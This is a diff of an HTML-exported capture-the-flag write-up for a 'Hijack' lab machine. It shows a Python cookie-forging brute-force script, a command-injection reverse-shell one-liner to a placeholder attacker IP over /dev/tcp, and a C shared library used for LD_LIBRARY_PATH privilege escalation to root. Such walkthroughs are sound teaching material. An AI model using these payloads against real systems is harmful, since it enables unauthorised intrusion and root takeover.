@@ -510,11 +510,7 @@
             <hr>
             <p>Initial nmap scan showed 6 open ports which included</p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">HTTP - 80
-NFS  - 2049
-FTP  - 21
-SSH  - 22
-RPC  - 111</pre>
+              
                <pre class="hljs"><code><span class="hljs-attribute">HTTP</span> - <span class="hljs-number">80</span>
 <span class="hljs-attribute">NFS</span>  - <span class="hljs-number">2049</span>
 <span class="hljs-attribute">FTP</span>  - <span class="hljs-number">21</span>
@@ -529,11 +525,7 @@ RPC  - 111</pre>
                Logged in to ftp, and retrieved two important files:
             </p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="bash" data-joplin-source-open="```bash&#10;" data-joplin-source-close="&#10;```">└──╼ $cat from_admin.txt 
-To all employees, this is &quot;admin&quot; speaking,
-i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.
-
-NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.</pre>
+               
                <pre class="hljs"><code>└──╼ <span class="hljs-variable">$cat</span> from_admin.txt 
 To all employees, this is <span class="hljs-string">&quot;admin&quot;</span> speaking,
 i came up with a safe list of passwords that you all can use on the site, these passwords don<span class="hljs-string">&#x27;t appear on any wordlist i tested so far, so i encourage you to use them, even me i&#x27;</span>m using one of those.
@@ -542,11 +534,7 @@ NOTE To rick : good job on limiting login attempts, it works like a charm, this 
             </div>
             <p>(we understand that the admin has &quot;admin&quot; as username and there is a user named rick)</p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">└──╼ $cat list_passwords.txt 
-Vxb38mSNN8wxqHxv6uMX
-56J4Zw6cvz8qDvhCWCVy
-qLnqTXydnY3ktstntLGu
-[...snip...]</pre>
+              
                <pre class="hljs"><code>└──╼ $cat list_passwords.txt 
 Vxb38mSNN8wxqHxv6uMX
 <span class="hljs-number">56</span>J4Zw6cvz8qDvhCWCVy
@@ -559,52 +547,7 @@ qLnqTXydnY3ktstntLGu
             <p>Upon logging in the webapp, and testing out various functionalities, found that the administration.php page is not accessible, and the cookie PHPSESSID is a base64 encoded text in format &lt;username&gt;:&lt;MD5_password_hash&gt;</p>
             <p>Created a python script to FUZZ the cookie and get access to admin:</p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="python" data-joplin-source-open="```python&#10;" data-joplin-source-close="&#10;```">#!/usr/bin/python3
-
-import hashlib
-import base64
-import requests
-
-class hijack:
-    def __init__(self, passfile, default_user):
-        self.passfile = passfile
-        self.default_user = default_user
-
-    # method to create cookies in format (hashed) 
-    def create_cookies(self):
-        with open(self.passfile, 'r') as f:
-            passes = [i.strip() for i in f.readlines()]
-        pass_hashed = [hashlib.md5(j.encode()).hexdigest() for j in passes]
-
-        final_cookies=[]
-        for md5pass in pass_hashed:
-            final_cookies.append(
-                base64.urlsafe_b64encode(
-                    (self.default_user+':'+md5pass).encode()
-                ).decode())
-        #list of cookies pass hashed and base64 encoded
-        return final_cookies
-
-print('-&gt; creating cookies')
-URL = &quot;http://10.10.247.174/administration.php&quot;
-h = hijack('list_passwords.txt','admin')
-cooks = h.create_cookies()
-
-print('-&gt; Attacking...')
-
-# FUZZing
-counter = 0
-for c in cooks:
-    cookies={'PHPSESSID':c }
-    r = requests.get(URL, cookies=cookies)
-    if 'Access denied' not in r.text:
-        print(r.text)
-        print('*'*10,&quot;COOKIE FOUND:&quot;,c)
-        break
-
-    print(&quot;Request no:&quot;,counter,end='\r')
-    counter+=1
-</pre>
+               
                <pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
 
 <span class="hljs-keyword">import</span> hashlib
@@ -657,9 +600,7 @@ counter = <span class="hljs-number">0</span>
                whatever service typed, got the following result:
             </p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="plaintext" data-joplin-source-open="```plaintext&#10;" data-joplin-source-close="&#10;```">* nginx.service
-   Loaded: not-found (Reason: No such file or directory)
-   Active: inactive (dead)</pre>
+             
                <pre class="hljs"><code>* nginx.service
    Loaded: not-found (Reason: No such file or directory)
    Active: inactive (dead)</code></pre>
@@ -668,7 +609,7 @@ counter = <span class="hljs-number">0</span>
             <div class="joplin-editable">
                <pre class="joplin-source" data-joplin-language="bash" data-joplin-source-open="```bash&#10;" data-joplin-source-close="&#10;```">`bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;MY_IP&gt;/9001 0&gt;&amp;1'`
 </pre>
-               <pre class="hljs"><code>`bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/&lt;MY_IP&gt;/9001 0&gt;&amp;1&#x27;</span>`
+             
 </code></pre>
             </div>
             <p>now the command inside the tildes will be executed first before calling the systemctl for statuscheck.</p>
@@ -679,14 +620,7 @@ counter = <span class="hljs-number">0</span>
             <p>Found rick's credentials from config.php, and could SU/SSH into rick with the same password (credential reuse).</p>
             <p>check sudo permissions, found that we can execute the following:</p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="shell" data-joplin-source-open="```shell&#10;" data-joplin-source-close="&#10;```">rick@Hijack:/etc/apache2$ sudo -l
-Matching Defaults entries for rick on Hijack:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    env_keep+=LD_LIBRARY_PATH
 
-User rick may run the following commands on Hijack:
-    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
-</pre>
                <pre class="hljs"><code>rick@Hijack:/etc/apache2$ sudo -l
 Matching Defaults entries for rick on Hijack:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
@@ -703,19 +637,7 @@ User rick may run the following commands on Hijack:
             <p><em>&quot; When a program is running, LD_PRELOAD loads a shared object before any others. By writing a simple script with init() function, it will help us execute code as soon as the object is loaded. &quot;</em></p>
             <p>First step is to check the shared libraries used by apache2 binary:</p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="plaintext" data-joplin-source-open="```plaintext&#10;" data-joplin-source-close="&#10;```">rick@Hijack:/tmp$ ldd /usr/sbin/apache2
-    linux-vdso.so.1 =&gt;  (0x00007ffdfcbd4000)
-    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007febc0b4d000)
-    libaprutil-1.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007febc0926000)
-    libapr-1.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007febc06f4000)
-    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007febc04d7000)
-    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007febc010d000)
-    libcrypt.so.1 =&gt; /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007febbfed5000)
-    libexpat.so.1 =&gt; /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007febbfcac000)
-    libuuid.so.1 =&gt; /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007febbfaa7000)
-    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007febbf8a3000)
-    /lib64/ld-linux-x86-64.so.2 (0x00007febc1062000)
-</pre>
+ 
                <pre class="hljs"><code>rick@Hijack:/tmp$ ldd /usr/sbin/apache2
     linux-vdso.so.1 =&gt;  (0x00007ffdfcbd4000)
     libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007febc0b4d000)
@@ -732,18 +654,7 @@ User rick may run the following commands on Hijack:
             </div>
             <p><strong>hijack.c</strong></p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="C" data-joplin-source-open="```C&#10;" data-joplin-source-close="&#10;```">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-// making the method a init method
-static void privesc() __attribute__((constructor));
-
-void privesc() {
-    unsetenv(&quot;LD_LIBRARY_PATH&quot;);
-    setresuid(0,0,0);
-    system(&quot;/bin/bash -p&quot;);
-}
-</pre>
+               
                <pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
 
@@ -764,12 +675,7 @@ void privesc() {
             <h2 id="exploitation">Exploitation</h2>
             <p><strong>Run sudo</strong></p>
             <div class="joplin-editable">
-               <pre class="joplin-source" data-joplin-language="plaintext" data-joplin-source-open="```plaintext&#10;" data-joplin-source-close="&#10;```">rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
-/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
-
-root@Hijack:/tmp# whoami
-root
-</pre>
+ 
                <pre class="hljs"><code>rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 /usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
 
